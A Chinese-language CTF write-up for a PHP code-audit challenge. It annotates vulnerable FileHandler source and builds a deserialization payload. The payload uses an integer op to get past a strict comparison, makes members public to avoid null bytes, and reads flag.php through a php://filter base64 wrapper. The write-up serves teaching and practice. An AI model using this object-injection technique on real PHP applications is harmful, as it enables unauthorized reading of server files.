#### 进入题目，便是php的代码
#### 这是一个代码审计题目（序列化和反序列化）
###### 【注】在代码中我已经给出了部分的注释
```php
<?php
// 文件包含
include("flag.php");

highlight_file(__FILE__);

// 阐述FileHandler类
class FileHandler {

    protected $op;
    protected $filename;
    protected $content;
  
    // 构造函数，将op filename content分别赋值为 = "1" "/tmp/tmpfile" "Hello World!"
    function __construct() {
        $op = "1";
        $filename = "/tmp/tmpfile";
        $content = "Hello World!";
        $this->process();
    }

    public function process() {
        if($this->op == "1") {    // 弱类型比较
            $this->write();       // 进入write函数
        } else if($this->op == "2") {     // 弱类型比较，可用2 == "2"为true来绕过
            $res = $this->read();
            $this->output($res);
        } else {
            $this->output("Bad Hacker!");
        }
    }

    private function write() {
        if(isset($this->filename) && isset($this->content)) {
            if(strlen((string)$this->content) > 100) {
                $this->output("Too long!");
                die();
            }
            $res = file_put_contents($this->filename, $this->content);
            if($res) $this->output("Successful!");
            else $this->output("Failed!");
        } else {
            $this->output("Failed!");
        }
    }

    private function read() {
        $res = "";
        if(isset($this->filename)) {
            $res = file_get_contents($this->filename);  // file_get_contents() 把整个文件读入一个字符串中，可用文件包含将flag.php读入字符串
        }
        return $res;
    }

    private function output($s) {
        echo "[Result]: <br>";
        echo $s;
    }

    function __destruct() {     // 析构函数
        if($this->op === "2")   // 强类型比较,为了不让op被强制改为1，而又让op为2，可用让op=2
            $this->op = "1";
        $this->content = "";
        $this->process();
    }

}

function is_valid($s) {
    for($i = 0; $i < strlen($s); $i++)
        if(!(ord($s[$i]) >= 32 && ord($s[$i]) <= 125))    // 判断有无特殊字符等
            return false;
    return true;
}

if(isset($_GET{'str'})) {

    $str = (string)$_GET['str'];
    if(is_valid($str)) {
        $obj = unserialize($str);       // 反序列化
    }

}
```

#### 根据上面的分析，我们可以得出以下的内容:
##### 1、str传入的值需要是对于FileHandler的序列化内容
```php
// 序列化的内容可以在自己的电脑上运行出此类的序列化内容
$a = new FileHandler();
echo base64_encode(serialize($a)); // 然后对其结果bae64解密即可，对于加密的原因，由于有时候private和protect类序列化后，肉眼不可见。因此，bae64加密方便我们的复制
```
##### 2、读取文件我们需要进入read函数
##### 3、我们需要进入process函数，并且$this->op == "2"为true
##### 4、在str被反序列化的时候，调用了析构函数，因此我们不能让下面的代码实现
```php
if($this->op === "2")
        $this->op = "1";
```

#### 因此，我们的str的成员赋值为:
```
protect $op = 2;
protect $filename = "php://filter/read=convert.base64-encode/resource=flag.php";
protect $content;
```

#### 由于protect类的成员在序列化的时候是以%00作为标识符，但是会被下面的函数返回false而终止
```php
function is_valid($s) {
    for($i = 0; $i < strlen($s); $i++)
        if(!(ord($s[$i]) >= 32 && ord($s[$i]) <= 125))
            return false;
    return true;
}
```

#### 下面提供一种方法
##### 对于php>7.1的版本，并不注重public和protect，因此我们可以把上面的三个类成员均改为public
```
public $op = 2;
public $filename = "php://filter/read=convert.base64-encode/resource=flag.php";
public $content;
```

#### 至此就可以完成此题目，payload为:
```
?str=O:11:"FileHandler":3:{s:2:"op";i:2;s:8:"filename";s:57:"php://filter/read=convert.base64-encode/resource=flag.php";s:7:"content";N;}
```
